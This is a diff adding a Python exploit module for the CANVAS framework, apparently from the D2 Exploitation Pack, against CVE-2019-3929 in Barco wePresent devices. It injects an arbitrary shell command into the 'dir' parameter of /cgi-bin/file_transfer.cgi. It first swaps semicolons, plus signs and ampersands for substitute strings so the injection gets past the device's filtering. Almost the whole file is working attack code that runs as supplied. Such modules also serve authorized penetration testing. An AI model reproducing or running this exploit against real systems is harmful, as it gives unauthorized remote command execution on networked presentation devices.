@@ -1,0 +1,129 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+import sys
+import time
+import os
+import random
+import base64
+import io
+import zipfile
+import re
+import urllib
+import json
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Barco wePresent Remote Command Execution Vulnerability"
+
+DESCRIPTION = "Remote command execution vulnerability in Barco wePresent"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Barco"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["Date public"] = "2019.04.30"
+DOCUMENTATION["References"] = "https://medium.com/tenable-techblog/eight-devices-one-exploit-f5fc28c70a7c"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2019-3929" 
+DOCUMENTATION["CVE Url"] = "https://nvd.nist.gov/vuln/detail/CVE-2019-3929"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.cmd = "id"        
+    self.basepath = "/"    
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 0
+    self.name = NAME
+    return
+	
+  def exec_cmd(self, cmd):                   
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+    
+    url = "/cgi-bin/file_transfer.cgi"
+    params = "file_transfer=new&dir='%s'"%cmd           
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")   
+    ua.addHeader("Content-Type", "application/x-www-form-urlencoded")
+    buff = ua.POST(mainurl, params)                       
+    return buff                       	
+        
+  def encode_payload(self, cmd):
+    cmd = ";%s;"%cmd  
+    cmd = cmd.replace(';', 'Pa_Note')
+    cmd = cmd.replace('+', 'Pa_Add')
+    cmd = cmd.replace('&', 'Pa_Amp')
+    return cmd
+            
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)     
+    self.cmd = self.argsDict.get("cmd", self.cmd)
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host)) 
+    buff = self.exec_cmd(self.encode_payload(self.cmd))    
+    self.log('[D2] Output:\n%s'%buff.strip())        
+            
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return 1
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
